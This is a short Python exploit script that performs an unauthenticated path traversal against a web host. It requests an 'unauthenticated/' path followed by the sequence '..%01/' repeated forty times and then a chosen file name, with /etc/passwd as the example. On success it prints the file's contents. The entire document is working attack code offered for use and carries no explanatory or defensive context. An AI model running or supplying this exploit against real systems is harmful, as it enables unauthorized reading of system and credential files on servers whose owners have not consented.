#!/usr/bin/python

import requests
import argparse


def main(host, file):
	try:
		page = "unauthenticated/"
		payload = "..%01/" * 40

		r = requests.get(f"{host}/{page}{payload}{file}")

		if r.status_code == 200:
			print("##########################\nExploited with successfuly\n##########################\n")
			print(r.content)
		if r.status_code != 200:
			print("##########################\nExploit failed\n##########################\n")
	except:
			print("##########################\nExploit failed\n##########################\n")


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("host", help="Add the host, ex: http://192.168.0.1")
	parser.add_argument("file", help="Add the filename, ex: /etc/passwd")
	args = parser.parse_args()	

	if args.host and args.file:
		main(args.host, args.file)
